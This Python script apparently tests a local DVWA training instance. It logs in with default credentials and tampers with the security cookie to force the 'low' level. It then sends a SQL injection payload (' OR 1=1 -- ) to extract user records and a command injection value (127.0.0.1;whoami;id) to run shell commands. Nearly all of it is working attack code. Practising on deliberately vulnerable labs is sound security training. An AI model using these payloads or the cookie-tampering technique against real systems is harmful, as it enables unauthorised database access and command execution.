
import requests
import re

s = requests.Session()

# Step 1: Login to DVWA
r = s.get("http://localhost:28080/login.php")
token = re.search(r"user_token['\s]*value=['\"]([^'\"]+)", r.text).group(1)
r = s.post("http://localhost:28080/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}, allow_redirects=True)
print(f"[+] Login: {r.url} (status {r.status_code})")

# Step 2: Check current security level
r = s.get("http://localhost:28080/security.php")
level_match = re.search(r"Security Level.*?<em>(\w+)</em>", r.text, re.DOTALL)
if level_match:
    print(f"[+] Current DVWA security level: {level_match.group(1)}")
else:
    print("[-] Could not determine security level")

# Step 3: Try cookie tampering - force security=low client-side
for c in list(s.cookies):
    if c.name == 'security':
        print(f"[!] Existing security cookie: {c.value} (domain={c.domain})")
        s.cookies.clear(c.domain, c.path, c.name)

s.cookies.set("security", "low", domain="localhost", path="/")
s.cookies.set("security", "low", domain="localhost.local", path="/")
print(f"[+] Forced security=low via cookie tampering")

# Step 4: Test SQLi with tampered cookie
r = s.get("http://localhost:28080/vulnerabilities/sqli/", params={
    "id": "' OR 1=1 -- ",
    "Submit": "Submit"
})

# Extract results
results = re.findall(r"First name:\s*(.*?)<br\s*/?>", r.text)
surnames = re.findall(r"Surname:\s*(.*?)<br\s*/?>", r.text)

if results:
    print(f"\n{'='*60}")
    print(f"[+] SQL INJECTION via COOKIE TAMPERING SUCCEEDED!")
    print(f"[+] Extracted {len(results)} records despite 'impossible' level")
    print(f"{'='*60}")
    for i, (fn, sn) in enumerate(zip(results, surnames)):
        print(f"    [{i+1}] {fn.strip()} | {sn.strip()}")
else:
    print(f"[-] Cookie tampering did NOT bypass impossible level")
    print(f"    (Server-side enforcement blocks client-side tampering)")
    # Show what the page actually returns
    pre_match = re.findall(r'<pre>(.*?)</pre>', r.text)
    if pre_match:
        print(f"    Server response: {pre_match[0][:200]}")

# Step 5: Test command injection with tampered cookie
r = s.get("http://localhost:28080/vulnerabilities/exec/", params={
    "ip": "127.0.0.1;whoami;id",
    "Submit": "Submit"
})
cmd_output = re.findall(r'<pre>(.*?)</pre>', r.text)
if cmd_output and ('uid=' in cmd_output[0] or 'root' in cmd_output[0]):
    print(f"\n[+] COMMAND INJECTION via COOKIE TAMPERING SUCCEEDED!")
    print(f"    Output: {cmd_output[0][:200]}")
else:
    print(f"[-] Command injection also blocked (impossible level enforced server-side)")

